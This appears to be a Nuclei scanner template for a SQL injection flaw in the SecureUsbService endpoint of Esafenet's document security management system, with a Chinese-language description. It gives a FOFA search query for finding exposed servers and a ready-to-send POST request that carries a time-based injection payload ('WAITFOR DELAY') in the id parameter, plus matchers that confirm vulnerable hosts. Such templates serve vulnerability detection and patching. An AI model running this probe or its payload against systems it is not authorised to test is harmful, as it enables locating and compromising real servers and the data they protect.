id: esafenet-secureusbservice-sqli
info:
  name: 亿赛通电子文档安全管理系统SecureUsbService 存在SQL注入漏洞
  author: onewin
  severity: high
  tags: 亿赛通数据泄露防护(DLP)系统,亿赛通-电子文档安全管理系统
  description: |
    亿某通电子文档安全管理系统 SecureUsbService 接口的id参数处对传入的数据没有预编译和充足的校验，导致该接口存在SQL注入漏洞，恶意攻击者可能通过该漏洞获取服务器信息或者直接获取服务器权限
  metadata:
    fofa-query: body="CDGServer3"

http:
  - raw:
      - |-
        @timeout: 30s
        POST /CDGServer3/device/SecureUsbService;login HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Content-Type: application/x-www-form-urlencoded

        command=DelSecureUsb&id=a';WAITFOR+DELAY+'0:0:4'--

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration>=4"
      - type: status
        status:
          - 404
      - type: word
        words:
          - "Freedom LiFe"
